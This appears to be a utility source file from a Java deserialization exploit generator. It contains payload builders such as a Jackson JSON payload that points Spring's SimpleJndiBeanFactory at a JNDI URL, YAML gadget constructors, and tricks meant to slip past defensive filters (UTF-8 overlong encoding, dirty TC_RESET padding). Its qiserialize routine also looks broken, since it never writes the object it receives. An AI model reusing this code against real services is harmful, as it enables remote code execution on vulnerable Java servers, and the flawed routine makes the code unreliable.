package com.qi4l.JYso.gadgets.utils;


import com.caucho.hessian.io.*;
import com.cedarsoftware.util.io.JsonWriter;
import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Output;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.qi4l.JYso.gadgets.C3P0WrapperConnPool;
import com.qi4l.JYso.gadgets.utils.utf8OverlongEncoding.UTF8OverlongObjectOutputStream;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.thoughtworks.xstream.XStream;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.*;
import java.util.concurrent.Callable;

import static com.qi4l.JYso.gadgets.Config.Config.*;

public class Serializer implements Callable<byte[]> {
    public static Boolean globalinline = false;
    private final Object object;

    public Serializer(Object object) {
        this.object = object;
    }

    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        serialize(obj, out);
        return out.toByteArray();
    }

    public static byte[] serialize(final Object obj, final ByteArrayOutputStream out) throws IOException {
        final ObjectOutputStream objOut;
        objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        byte[] bytes = out.toByteArray();
        objOut.close();
        return bytes;
    }


    public static void qiserialize(
            Object obj,
            final OutputStream out
    ) throws Exception {
        ByteArrayOutputStream outB64 = new ByteArrayOutputStream();

        if (IS_DIRTY_IN_TC_RESET) {
            new SuObjectOutputStream(out);
        } else if (IS_UTF_Bypass) {
            if (BASE64) {
                new UTF8OverlongObjectOutputStream(outB64);
            } else {
                new UTF8OverlongObjectOutputStream(out);
            }
        } else {
            if (BASE64) {
                new SuObjectOutputStream(outB64);
            } else {
                new SuObjectOutputStream(out);
            }
        }

        if (BASE64) {
            String encodedString = Base64.getEncoder().encodeToString(outB64.toByteArray());
            System.out.println(encodedString);
        }
    }

    protected static String writeObject(Class<?> clazz, Map<String, String> properties) {
        return writeObject(clazz.getName(), properties);
    }

    protected static String writeObject(String clazz, Map<String, String> properties) {
        return writeObject(clazz, properties, 0);
    }

    protected static String writeObject(Class<?> clazz, Map<String, String> properties, int level) {
        return writeObject(clazz.getName(), properties, level);
    }

    protected static String writeObject(String clazz, Map<String, String> properties, int level) {
        StringBuilder sb = new StringBuilder();
        sb.append(writeConstructor(clazz, globalinline));

        if (!properties.isEmpty()) {
            int indent = (level + 1) * 2;
            for (Map.Entry<String, String> prop : properties.entrySet()) {
                sb.append('\n');
                for (int i = 0; i < indent; i++) {
                    sb.append(' ');
                }
                sb.append(prop.getKey());
                sb.append(':').append(' ');
                sb.append(prop.getValue());
            }
        }
        return sb.toString();
    }

    protected static String writeConstructor(String clazz, boolean inline) {
        return constructorPrefix(inline) +
                clazz;
    }

    protected static String constructorPrefix(boolean inline) {
        if (!inline) {
            return "foo: !";
        }
        return "!";
    }

    public static String writeString(String string) {
        return '"' + string + '"';
    }

    public static String writeJackJsonObject(Class<?> clazz, Map<String, String> values) {
        return writeJackJsonObject(clazz.getName(), values);
    }

    public static String writeJackJsonObject(String type, Map<String, String> properties) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        sb.append('"').append(type).append('"');
        sb.append(',');
        sb.append('{');
        boolean first = true;
        for (Map.Entry<String, String> e : properties.entrySet()) {
            if (!first) {
                sb.append(',');
            } else {
                first = false;
            }
            writeProperty(sb, e.getKey(), e.getValue());
        }
        sb.append('}');
        sb.append(']');
        return sb.toString();
    }

    public static void writeProperty(StringBuilder sb, String key, String value) {
        sb.append('"').append(key).append('"');
        sb.append(':');
        sb.append(value);
    }

    public static String writeCollection(String type, String... values) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        sb.append('"').append(type).append('"');
        sb.append(',');
        arrayHandler(sb, values);
        sb.append(']');
        return sb.toString();
    }

    public static void arrayHandler(StringBuilder sb, String[] values) {
        sb.append('[');
        boolean first = true;
        for (String val : values) {
            if (!first) {
                sb.append(',');
            } else {
                first = false;
            }
            sb.append(val);
        }
        sb.append(']');
    }

    public static String makeSpringJndiBeanFactory(String jndiUrl) {
        return writeJackJsonObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(quoteString(jndiUrl))));
    }

    public static String quoteString(String string) {
        return '"' + string + '"';
    }

    public static String writeArray(String... elements) {
        StringBuilder sb = new StringBuilder();
        arrayHandler(sb, elements);
        return sb.toString();
    }

    public byte[] call() throws Exception {
        return serialize(object);
    }

    public static class SuObjectOutputStream extends ObjectOutputStream {

        public SuObjectOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void writeStreamHeader() throws IOException {
            super.writeStreamHeader();
            try {
                // 写入
                for (int i = 0; i < DIRTY_LENGTH_IN_TC_RESET; i++) {
                    Reflections.getMethodAndInvoke(Reflections.getFieldValue(this, "bout"), "writeByte", new Class[]{int.class}, new Object[]{TC_RESET});
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static class NoWriteReplaceSerializerFactory extends SerializerFactory {

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
         */
        @Override
        public com.caucho.hessian.io.Serializer getObjectSerializer(Class<?> cl) throws HessianProtocolException {
            return super.getObjectSerializer(cl);
        }

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
         */
        @Override
        public com.caucho.hessian.io.Serializer getSerializer(Class cl) throws HessianProtocolException {
            com.caucho.hessian.io.Serializer serializer = super.getSerializer(cl);

            if (serializer instanceof WriteReplaceSerializer) {
                return UnsafeSerializer.create(cl);
            }
            return serializer;
        }
    }


}